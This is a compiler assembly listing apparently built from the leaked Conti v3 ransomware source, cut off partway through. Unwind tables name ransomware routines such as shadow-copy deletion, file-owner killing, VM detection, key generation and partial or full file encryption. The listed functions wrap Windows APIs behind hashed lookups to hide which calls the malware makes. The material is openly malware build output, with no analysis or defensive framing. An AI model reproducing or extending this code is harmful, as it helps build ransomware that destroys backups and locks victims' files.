;	COMDAT xdata
xdata	SEGMENT
$unwind$?pStrStrIW@@YAPEB_WPEB_W0@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pSysAllocString@@YAPEA_WPEB_W@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pVariantInit@@YAXPEAUtagVARIANT@@@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pVariantClear@@YAJPEAUtagVARIANT@@@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?CmdExecW@@YAXPEB_W@Z DD 072b19H
	DD	0122741aH
	DD	0121341aH
	DD	011e011aH
	DD	0500bH
	DD	imagerel __GSHandlerCheck
	DD	08e0H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$4$?DeleteShadowCopies@cryptor@@YAFPEAX@Z DD 021H
	DD	imagerel $LN1686
	DD	imagerel $LN1686+97
	DD	imagerel $unwind$?DeleteShadowCopies@cryptor@@YAFPEAX@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$3$?DeleteShadowCopies@cryptor@@YAFPEAX@Z DD 021H
	DD	imagerel $LN1686+532
	DD	imagerel $LN1686+1099
	DD	imagerel $chain$1$?DeleteShadowCopies@cryptor@@YAFPEAX@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$2$?DeleteShadowCopies@cryptor@@YAFPEAX@Z DD 020821H
	DD	014e3408H
	DD	imagerel $LN1686+532
	DD	imagerel $LN1686+1099
	DD	imagerel $chain$1$?DeleteShadowCopies@cryptor@@YAFPEAX@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$1$?DeleteShadowCopies@cryptor@@YAFPEAX@Z DD 020821H
	DD	014fe408H
	DD	imagerel $LN1686+97
	DD	imagerel $LN1686+532
	DD	imagerel $chain$0$?DeleteShadowCopies@cryptor@@YAFPEAX@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$0$?DeleteShadowCopies@cryptor@@YAFPEAX@Z DD 020821H
	DD	0150f408H
	DD	imagerel $LN1686
	DD	imagerel $LN1686+97
	DD	imagerel $unwind$?DeleteShadowCopies@cryptor@@YAFPEAX@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?DeleteShadowCopies@cryptor@@YAFPEAX@Z DD 052419H
	DD	014a0113H
	DD	060037004H
	DD	05002H
	DD	imagerel __GSHandlerCheck
	DD	0a40H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?CheckForDataBases@@YAHPEB_W@Z DD 072001H
	DD	02167420H
	DD	02143420H
	DD	02120120H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?CheckForVirtualMachines@@YAHPEB_W@Z DD 071a01H
	DD	046741aH
	DD	044341aH
	DD	042011aH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?WriteFullData@@YAHPEAX0K@Z DD 0a2519H
	DD	0133417H
	DD	0f0107217H
	DD	0d00ce00eH
	DD	07008c00aH
	DD	050066007H
	DD	imagerel __GSHandlerCheck
	DD	038H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$3$?KillFileOwner@@YAHPEB_W@Z DD 040021H
	DD	0267400H
	DD	0256400H
	DD	imagerel $LN217
	DD	imagerel $LN217+453
	DD	imagerel $unwind$?KillFileOwner@@YAHPEB_W@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$2$?KillFileOwner@@YAHPEB_W@Z DD 021H
	DD	imagerel $LN217
	DD	imagerel $LN217+453
	DD	imagerel $unwind$?KillFileOwner@@YAHPEB_W@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$1$?KillFileOwner@@YAHPEB_W@Z DD 041021H
	DD	0267410H
	DD	0256408H
	DD	imagerel $LN217
	DD	imagerel $LN217+453
	DD	imagerel $unwind$?KillFileOwner@@YAHPEB_W@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?KillFileOwner@@YAHPEB_W@Z DD 052019H
	DD	0273412H
	DD	0220112H
	DD	05006H
	DD	imagerel __GSHandlerCheck
	DD	0100H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?ChangeFileName@cryptor@@YAHPEB_W@Z DD 064201H
	DD	067442H
	DD	08340aH
	DD	06006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$2$?GenKey@@YAH_K0PEAUfile_info@cryptor@@@Z DD 021H
	DD	imagerel $LN274
	DD	imagerel $LN274+542
	DD	imagerel $unwind$?GenKey@@YAH_K0PEAUfile_info@cryptor@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$1$?GenKey@@YAH_K0PEAUfile_info@cryptor@@@Z DD 020521H
	DD	0ae405H
	DD	imagerel $LN274
	DD	imagerel $LN274+542
	DD	imagerel $unwind$?GenKey@@YAH_K0PEAUfile_info@cryptor@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?GenKey@@YAH_K0PEAUfile_info@cryptor@@@Z DD 09fd19H
	DD	01564fdH
	DD	0f00aa211H
	DD	0c006d008H
	DD	030037004H
	DD	05002H
	DD	imagerel __GSHandlerCheck
	DD	048H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?WriteEncryptInfo@@YAHPEAUfile_info@cryptor@@EE@Z DD 093019H
	DD	045741fH
	DD	044641fH
	DD	043341fH
	DD	040011fH
	DD	05010H
	DD	imagerel __GSHandlerCheck
	DD	01f0H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?OpenFileEncrypt@@YAKPEAUfile_info@cryptor@@@Z DD 093019H
	DD	053741fH
	DD	052641fH
	DD	051341fH
	DD	04e011fH
	DD	05010H
	DD	imagerel __GSHandlerCheck
	DD	0268H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?EncryptHeader@@YAHPEAUfile_info@cryptor@@PEAE_K2@Z DD 0a3619H
	DD	0126436H
	DD	0f00c7213H
	DD	0d008e00aH
	DD	07004c006H
	DD	050023003H
	DD	imagerel __GSHandlerCheck
	DD	038H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$4$?EncryptPartly@@YAHPEAUfile_info@cryptor@@PEAE_K2E@Z DD 021H
	DD	imagerel $LN1649
	DD	imagerel $LN1649+5168
	DD	imagerel $unwind$?EncryptPartly@@YAHPEAUfile_info@cryptor@@PEAE_K2E@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$3$?EncryptPartly@@YAHPEAUfile_info@cryptor@@PEAE_K2E@Z DD 082721H
	DD	0ee427H
	DD	0fd41bH
	DD	0106416H
	DD	0183408H
	DD	imagerel $LN1649
	DD	imagerel $LN1649+5168
	DD	imagerel $unwind$?EncryptPartly@@YAHPEAUfile_info@cryptor@@PEAE_K2E@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?EncryptPartly@@YAHPEAUfile_info@cryptor@@PEAE_K2E@Z DD 062119H
	DD	0110113H
	DD	0c005f007H
	DD	050027003H
	DD	imagerel __GSHandlerCheck
	DD	060H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$3$?EncryptFull@@YAHPEAUfile_info@cryptor@@PEAE_K2@Z DD 021H
	DD	imagerel $LN289
	DD	imagerel $LN289+60
	DD	imagerel $unwind$?EncryptFull@@YAHPEAUfile_info@cryptor@@PEAE_K2@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$2$?EncryptFull@@YAHPEAUfile_info@cryptor@@PEAE_K2@Z DD 061821H
	DD	096418H
	DD	087413H
	DD	0123408H
	DD	imagerel $LN289
	DD	imagerel $LN289+60
	DD	imagerel $unwind$?EncryptFull@@YAHPEAUfile_info@cryptor@@PEAE_K2@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?EncryptFull@@YAHPEAUfile_info@cryptor@@PEAE_K2@Z DD 061f19H
	DD	0f00a9211H
	DD	0d006e008H
	DD	05002c004H
	DD	imagerel __GSHandlerCheck
	DD	038H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?Encrypt@cryptor@@YAHPEAUfile_info@1@PEAE_K2@Z DD 0b2101H
	DD	017e421H
	DD	0167421H
	DD	0156421H
	DD	0143421H
	DD	0120121H
	DD	05015H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?CloseFile@cryptor@@YAXPEAUfile_info@1@@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pReadFile@@YAHPEAX0KPEAKPEAU_OVERLAPPED@@@Z
_TEXT	SEGMENT
hFile$ = 64
lpBuffer$ = 72
nNumberOfBytesToRead$ = 80
lpNumberOfBytesRead$ = 88
lpOverlapped$dead$ = 96
?pReadFile@@YAHPEAX0KPEAKPEAU_OVERLAPPED@@@Z PROC	; pReadFile, COMDAT

; 90   : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	48 89 6c 24 10	 mov	 QWORD PTR [rsp+16], rbp
  0000a	48 89 74 24 18	 mov	 QWORD PTR [rsp+24], rsi
  0000f	57		 push	 rdi
  00010	48 83 ec 30	 sub	 rsp, 48			; 00000030H
  00014	48 8b f2	 mov	 rsi, rdx
  00017	49 8b d9	 mov	 rbx, r9

; 91   : 	BOOL(WINAPI * pFunction)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
; 92   : 	pFunction = (BOOL(WINAPI*)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x55f5048a, 105);//GetProcAddress(hKernel32, OBFA("ReadFile"));

  0001a	ba 0f 00 00 00	 mov	 edx, 15
  0001f	41 8b f8	 mov	 edi, r8d
  00022	41 b8 8a 04 f5
	55		 mov	 r8d, 1442120842		; 55f5048aH
  00028	48 8b e9	 mov	 rbp, rcx
  0002b	44 8d 4a 5a	 lea	 r9d, QWORD PTR [rdx+90]
  0002f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 93   : 	return pFunction(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);

  00034	4c 8b cb	 mov	 r9, rbx
  00037	48 c7 44 24 60
	00 00 00 00	 mov	 QWORD PTR lpOverlapped$dead$[rsp], 0
  00040	44 8b c7	 mov	 r8d, edi
  00043	48 8b d6	 mov	 rdx, rsi
  00046	48 8b cd	 mov	 rcx, rbp

; 94   : }

  00049	48 8b 5c 24 40	 mov	 rbx, QWORD PTR [rsp+64]
  0004e	48 8b 6c 24 48	 mov	 rbp, QWORD PTR [rsp+72]
  00053	48 8b 74 24 50	 mov	 rsi, QWORD PTR [rsp+80]
  00058	48 83 c4 30	 add	 rsp, 48			; 00000030H
  0005c	5f		 pop	 rdi

; 93   : 	return pFunction(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);

  0005d	48 ff e0	 rex_jmp rax
?pReadFile@@YAHPEAX0KPEAKPEAU_OVERLAPPED@@@Z ENDP	; pReadFile
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pGetCurrentProcess@@YAPEAXXZ
_TEXT	SEGMENT
?pGetCurrentProcess@@YAPEAXXZ PROC			; pGetCurrentProcess, COMDAT

; 107  : {

$LN4:
  00000	48 83 ec 28	 sub	 rsp, 40			; 00000028H

; 108  : 	HANDLE(WINAPI * pFunction)();
; 109  : 	pFunction = (HANDLE(WINAPI*)())getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x3cd723f8, 103);//GetProcAddress(hKernel32, OBFA("GetCurrentProcess"));

  00004	ba 0f 00 00 00	 mov	 edx, 15
  00009	41 b8 f8 23 d7
	3c		 mov	 r8d, 1020732408		; 3cd723f8H
  0000f	44 8d 4a 58	 lea	 r9d, QWORD PTR [rdx+88]
  00013	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 111  : }

  00018	48 83 c4 28	 add	 rsp, 40			; 00000028H

; 110  : 	return pFunction();

  0001c	48 ff e0	 rex_jmp rax
?pGetCurrentProcess@@YAPEAXXZ ENDP			; pGetCurrentProcess
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pWriteFile@@YAHPEAXPEBXKPEAKPEAU_OVERLAPPED@@@Z
_TEXT	SEGMENT
hFile$ = 64
lpBuffer$ = 72
nNumberOfBytesToWrite$ = 80
lpNumberOfBytesWritten$ = 88
lpOverlapped$dead$ = 96
?pWriteFile@@YAHPEAXPEBXKPEAKPEAU_OVERLAPPED@@@Z PROC	; pWriteFile, COMDAT

; 120  : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	48 89 6c 24 10	 mov	 QWORD PTR [rsp+16], rbp
  0000a	48 89 74 24 18	 mov	 QWORD PTR [rsp+24], rsi
  0000f	57		 push	 rdi
  00010	48 83 ec 30	 sub	 rsp, 48			; 00000030H
  00014	48 8b f2	 mov	 rsi, rdx
  00017	49 8b d9	 mov	 rbx, r9

; 121  : 	BOOL(WINAPI * pFunction)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
; 122  : 	pFunction = (BOOL(WINAPI*)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x088f1e18, 102);//GetProcAddress(hKernel32, OBFA("WriteFile"));

  0001a	ba 0f 00 00 00	 mov	 edx, 15
  0001f	41 8b f8	 mov	 edi, r8d
  00022	41 b8 18 1e 8f
	08		 mov	 r8d, 143597080		; 088f1e18H
  00028	48 8b e9	 mov	 rbp, rcx
  0002b	44 8d 4a 57	 lea	 r9d, QWORD PTR [rdx+87]
  0002f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 123  : 	return pFunction(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);

  00034	4c 8b cb	 mov	 r9, rbx
  00037	48 c7 44 24 60
	00 00 00 00	 mov	 QWORD PTR lpOverlapped$dead$[rsp], 0
  00040	44 8b c7	 mov	 r8d, edi
  00043	48 8b d6	 mov	 rdx, rsi
  00046	48 8b cd	 mov	 rcx, rbp

; 124  : }

  00049	48 8b 5c 24 40	 mov	 rbx, QWORD PTR [rsp+64]
  0004e	48 8b 6c 24 48	 mov	 rbp, QWORD PTR [rsp+72]
  00053	48 8b 74 24 50	 mov	 rsi, QWORD PTR [rsp+80]
  00058	48 83 c4 30	 add	 rsp, 48			; 00000030H
  0005c	5f		 pop	 rdi

; 123  : 	return pFunction(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);

  0005d	48 ff e0	 rex_jmp rax
?pWriteFile@@YAHPEAXPEBXKPEAKPEAU_OVERLAPPED@@@Z ENDP	; pWriteFile
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pWow64DisableWow64FsRedirection@@YAHPEAPEAX@Z
_TEXT	SEGMENT
OldValue$ = 48
?pWow64DisableWow64FsRedirection@@YAHPEAPEAX@Z PROC	; pWow64DisableWow64FsRedirection, COMDAT

; 129  : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 130  : 	BOOL(WINAPI * pFunction)(PVOID*);
; 131  : 	pFunction = (BOOL(WINAPI*)(PVOID*))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x5126a209, 101);//GetProcAddress(hKernel32, OBFA("Wow64DisableWow64FsRedirection"));

  00006	ba 0f 00 00 00	 mov	 edx, 15
  0000b	41 b8 09 a2 26
	51		 mov	 r8d, 1361486345		; 5126a209H
  00011	48 8b d9	 mov	 rbx, rcx
  00014	44 8d 4a 56	 lea	 r9d, QWORD PTR [rdx+86]
  00018	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 132  : 	return pFunction(OldValue);

  0001d	48 8b cb	 mov	 rcx, rbx

; 133  : }

  00020	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00024	5b		 pop	 rbx

; 132  : 	return pFunction(OldValue);

  00025	48 ff e0	 rex_jmp rax
?pWow64DisableWow64FsRedirection@@YAHPEAPEAX@Z ENDP	; pWow64DisableWow64FsRedirection
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pGetProcessId@@YAKPEAX@Z
_TEXT	SEGMENT
Process$ = 48
?pGetProcessId@@YAKPEAX@Z PROC				; pGetProcessId, COMDAT

; 138  : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 139  : 	DWORD(WINAPI * pFunction)(HANDLE);
; 140  : 	pFunction = (DWORD(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x71114e08, 100);//GetProcAddress(hKernel32, OBFA("GetProcessId"));

  00006	ba 0f 00 00 00	 mov	 edx, 15
  0000b	41 b8 08 4e 11
	71		 mov	 r8d, 1896959496		; 71114e08H
  00011	48 8b d9	 mov	 rbx, rcx
  00014	44 8d 4a 55	 lea	 r9d, QWORD PTR [rdx+85]
  00018	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 141  : 	return pFunction(Process);

  0001d	48 8b cb	 mov	 rcx, rbx

; 142  : }

  00020	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00024	5b		 pop	 rbx

; 141  : 	return pFunction(Process);

  00025	48 ff e0	 rex_jmp rax
?pGetProcessId@@YAKPEAX@Z ENDP				; pGetProcessId
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pSetEndOfFile@@YAHPEAX@Z
_TEXT	SEGMENT
hFile$ = 48
?pSetEndOfFile@@YAHPEAX@Z PROC				; pSetEndOfFile, COMDAT

; 147  : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 148  : 	BOOL(WINAPI * pFunction)(HANDLE);
; 149  : 	pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x5fa74ea0, 99);//GetProcAddress(hKernel32, OBFA("SetEndOfFile"));

  00006	ba 0f 00 00 00	 mov	 edx, 15
  0000b	41 b8 a0 4e a7
	5f		 mov	 r8d, 1604800160		; 5fa74ea0H
  00011	48 8b d9	 mov	 rbx, rcx
  00014	44 8d 4a 54	 lea	 r9d, QWORD PTR [rdx+84]
  00018	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 150  : 	return pFunction(hFile);

  0001d	48 8b cb	 mov	 rcx, rbx

; 151  : }

  00020	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00024	5b		 pop	 rbx

; 150  : 	return pFunction(hFile);

  00025	48 ff e0	 rex_jmp rax
?pSetEndOfFile@@YAHPEAX@Z ENDP				; pSetEndOfFile
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pWaitForSingleObject@@YAKPEAXK@Z
_TEXT	SEGMENT
hHandle$ = 48
dwMilliseconds$ = 56
?pWaitForSingleObject@@YAKPEAXK@Z PROC			; pWaitForSingleObject, COMDAT

; 157  : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  0000a	8b da		 mov	 ebx, edx

; 158  : 	DWORD(WINAPI * pFunction)(HANDLE, DWORD);
; 159  : 	pFunction = (DWORD(WINAPI*)(HANDLE, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe0c23134, 98);//GetProcAddress(hKernel32, OBFA("WaitForSingleObject"));

  0000c	41 b8 34 31 c2
	e0		 mov	 r8d, -524144332		; e0c23134H
  00012	ba 0f 00 00 00	 mov	 edx, 15
  00017	48 8b f9	 mov	 rdi, rcx
  0001a	44 8d 4a 53	 lea	 r9d, QWORD PTR [rdx+83]
  0001e	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 160  : 	return pFunction(hHandle, dwMilliseconds);

  00023	8b d3		 mov	 edx, ebx
  00025	48 8b cf	 mov	 rcx, rdi

; 161  : }

  00028	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  0002d	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00031	5f		 pop	 rdi

; 160  : 	return pFunction(hHandle, dwMilliseconds);

  00032	48 ff e0	 rex_jmp rax
?pWaitForSingleObject@@YAKPEAXK@Z ENDP			; pWaitForSingleObject
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pGetFileAttributesW@@YAKPEB_W@Z
_TEXT	SEGMENT
lpFileName$ = 48
?pGetFileAttributesW@@YAKPEB_W@Z PROC			; pGetFileAttributesW, COMDAT

; 181  : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 182  : 	DWORD(WINAPI * pFunction)(LPCWSTR);
; 183  : 	pFunction = (DWORD(WINAPI*)(LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x81737792, 96);//GetProcAddress(hKernel32, OBFA("GetFileAttributesW"));

  00006	ba 0f 00 00 00	 mov	 edx, 15
  0000b	41 b8 92 77 73
	81		 mov	 r8d, -2123139182	; 81737792H
  00011	48 8b d9	 mov	 rbx, rcx
  00014	44 8d 4a 51	 lea	 r9d, QWORD PTR [rdx+81]
  00018	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 184  : 	return pFunction(lpFileName);

  0001d	48 8b cb	 mov	 rcx, rbx

; 185  : }

  00020	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00024	5b		 pop	 rbx

; 184  : 	return pFunction(lpFileName);

  00025	48 ff e0	 rex_jmp rax
?pGetFileAttributesW@@YAKPEB_W@Z ENDP			; pGetFileAttributesW
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pSetFileAttributesW@@YAHPEB_WK@Z
_TEXT	SEGMENT
lpFileName$ = 48
dwFileAttributes$ = 56
?pSetFileAttributesW@@YAHPEB_WK@Z PROC			; pSetFileAttributesW, COMDAT

; 191  : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  0000a	8b da		 mov	 ebx, edx

; 192  : 	BOOL(WINAPI * pFunction)(LPCWSTR, DWORD);
; 193  : 	pFunction = (BOOL(WINAPI*)(LPCWSTR, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x2e6f01df, 95);//GetProcAddress(hKernel32, OBFA("SetFileAttributesW"));

  0000c	41 b8 df 01 6f
	2e		 mov	 r8d, 779026911		; 2e6f01dfH
  00012	ba 0f 00 00 00	 mov	 edx, 15
  00017	48 8b f9	 mov	 rdi, rcx
  0001a	44 8d 4a 50	 lea	 r9d, QWORD PTR [rdx+80]
  0001e	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 194  : 	return pFunction(lpFileName, dwFileAttributes);

  00023	8b d3		 mov	 edx, ebx
  00025	48 8b cf	 mov	 rcx, rdi

; 195  : }

  00028	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  0002d	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00031	5f		 pop	 rdi

; 194  : 	return pFunction(lpFileName, dwFileAttributes);

  00032	48 ff e0	 rex_jmp rax
?pSetFileAttributesW@@YAHPEB_WK@Z ENDP			; pSetFileAttributesW
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pWow64RevertWow64FsRedirection@@YAHPEAX@Z
_TEXT	SEGMENT
OlValue$ = 48
?pWow64RevertWow64FsRedirection@@YAHPEAX@Z PROC		; pWow64RevertWow64FsRedirection, COMDAT

; 200  : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 201  : 	BOOL(WINAPI * pFunction)(PVOID);
; 202  : 	pFunction = (BOOL(WINAPI*)(PVOID))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x58cb0595, 94);//GetProcAddress(hKernel32, OBFA("Wow64RevertWow64FsRedirection"));

  00006	ba 0f 00 00 00	 mov	 edx, 15
  0000b	41 b8 95 05 cb
	58		 mov	 r8d, 1489700245		; 58cb0595H
  00011	48 8b d9	 mov	 rbx, rcx
  00014	44 8d 4a 4f	 lea	 r9d, QWORD PTR [rdx+79]
  00018	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 203  : 	return pFunction(OlValue);

  0001d	48 8b cb	 mov	 rcx, rbx

; 204  : }

  00020	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00024	5b		 pop	 rbx

; 203  : 	return pFunction(OlValue);

  00025	48 ff e0	 rex_jmp rax
?pWow64RevertWow64FsRedirection@@YAHPEAX@Z ENDP		; pWow64RevertWow64FsRedirection
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pGetLastError@@YAKXZ
_TEXT	SEGMENT
?pGetLastError@@YAKXZ PROC				; pGetLastError, COMDAT

; 207  : {

$LN4:
  00000	48 83 ec 28	 sub	 rsp, 40			; 00000028H

; 208  : 	DWORD(WINAPI * pFunction)();
; 209  : 	pFunction = (DWORD(WINAPI*)())getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x9aab3800, 93);//GetProcAddress(hKernel32, OBFA("GetLastError"));

  00004	ba 0f 00 00 00	 mov	 edx, 15
  00009	41 b8 00 38 ab
	9a		 mov	 r8d, -1700055040	; 9aab3800H
  0000f	44 8d 4a 4e	 lea	 r9d, QWORD PTR [rdx+78]
  00013	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 211  : }

  00018	48 83 c4 28	 add	 rsp, 40			; 00000028H

; 210  : 	return pFunction();

  0001c	48 ff e0	 rex_jmp rax
?pGetLastError@@YAKXZ ENDP				; pGetLastError
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?plstrcatW@@YAPEA_WPEA_WPEB_W@Z
_TEXT	SEGMENT
lpString1$ = 48
lpString2$ = 56
?plstrcatW@@YAPEA_WPEA_WPEB_W@Z PROC			; plstrcatW, COMDAT

; 217  : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  0000a	48 8b da	 mov	 rbx, rdx

; 218  : 	LPWSTR(WINAPI * pFunction)(LPWSTR, LPCWSTR);
; 219  : 	pFunction = (LPWSTR(WINAPI*)(LPWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xd1da9915, 92);//GetProcAddress(hKernel32, OBFA("lstrcatW"));

  0000d	41 b8 15 99 da
	d1		 mov	 r8d, -774203115		; d1da9915H
  00013	ba 0f 00 00 00	 mov	 edx, 15
  00018	48 8b f9	 mov	 rdi, rcx
  0001b	44 8d 4a 4d	 lea	 r9d, QWORD PTR [rdx+77]
  0001f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 220  : 	return pFunction(lpString1, lpString2);

  00024	48 8b d3	 mov	 rdx, rbx
  00027	48 8b cf	 mov	 rcx, rdi

; 221  : }

  0002a	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  0002f	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00033	5f		 pop	 rdi

; 220  : 	return pFunction(lpString1, lpString2);

